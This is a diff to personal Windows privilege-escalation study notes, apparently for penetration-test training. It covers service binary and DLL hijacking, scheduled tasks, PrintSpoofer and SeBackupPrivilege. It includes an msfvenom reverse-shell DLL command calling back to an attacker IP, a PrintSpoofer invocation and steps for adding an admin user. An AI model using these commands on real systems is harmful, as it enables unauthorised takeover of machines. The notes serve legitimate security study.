@@ -42,6 +42,8 @@
 
 # Hijack window service
 - Target find some exe origin is from that user and able to modify
+- If want to modify exe, better backup one first! e.g. ``` move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak ```
+- Can use rev shell / add user with powershell command (2 approach)
 ## Sevice binary
 - May require RDP to use
 - ``` Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} ``` get WMI (Windows Management Instrumentation)services and see starting path
@@ -84,6 +86,8 @@
         6. The directories that are listed in the PATH environment variable.
     ``` 
 - Process monitor maybe disabled for some user -> (still need priv) copy procmon binary to local and run 
+- can load rev shell inside dll e.g. ``` msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.250 LPORT=4444 -f dll -o EnterpriseServiceOptional.dll```
+
 ### Procmon tool
 - start and filter xxx.exe 
 - Filter Process name is xx.exe then trigger restart the exe  ``` Restart-Service xxx```
@@ -146,3 +150,25 @@
 - ``` Get-UnquotedService ``` fine unquoted path services
 - run the command mentioned in AbuseFunction and modify the path
 - Should get john in admin group if success ``` net localgroup administrators ```
+
+# Other Ways (non window services)
+## Scheuled task
+- list sch task list ``` schtasks /query /fo LIST /v ``` 
+- Care about taskname, author, task to run, next run time
+- check permission to run that task 
+- change the file to be run 
+
+## public exploit
+-  kernel exploit (easy crash)
+### printspoofer
+-  If ```whoami /priv``` shows ``` SeImpersonatePrivlege``` enabled = can use 
+-   ``` .\PrintSpoofer64.exe -i -c powershell.exe ```
+-   
+
+# Struggling point
+- may need one user jump to another and then jump to another and still not priviledged
+
+## fancy shit 
+1. SeBackupPrivilege (disabled) still can hack!
+    - https://github.com/giuliano108/SeBackupPrivilege 
+    - after enabled then copy the file out and read 
